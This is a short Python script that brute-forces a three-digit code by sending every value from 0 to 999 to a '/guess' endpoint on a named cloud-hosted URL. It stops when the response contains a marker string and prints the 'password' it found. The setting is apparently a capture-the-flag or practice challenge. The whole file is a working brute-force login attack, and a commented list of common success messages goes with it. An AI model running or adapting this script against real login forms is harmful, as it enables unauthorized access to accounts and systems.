import requests

# Define the URL of the login form
url = 'https://minuteman-muskets-xr6eisr4xa-uc.a.run.app/guess'

# Username to test with
headers = {
    "Content-Type": "application/json"
}

# Loop through numbers from 000 to 999
for num in range(1000):  
    payload = {
        'code': num
    }
    
    response = requests.post(url, json=payload, headers=headers)
    
    # arr = ["Correct", 'correct', 'welcome', "Success", 'success', 'Welcome',
    # 'Authorized', 'authorized', 'Login successful', 'login successful',
    # 'Access granted', 'access granted', 'Authenticated', 'authenticated',
    # 'Validation successful', 'validation successful', 'Success!', 
    # 'Logged in', 'logged in', 'Congratulations', 'congratulations',
    # 'You are now logged in', 'You have successfully logged in',
    # 'All done', 'All set', 'You have access', 'Access confirmed',
    # 'Entry granted', 'Welcome back', 'Enjoy your session']
    
    if 'cjDflkajsdbflakj' in response.text:
        print(f"Password found: {num}")
        break
    else:
        print(f"Attempt with password {num} failed.")
        print(response.text)
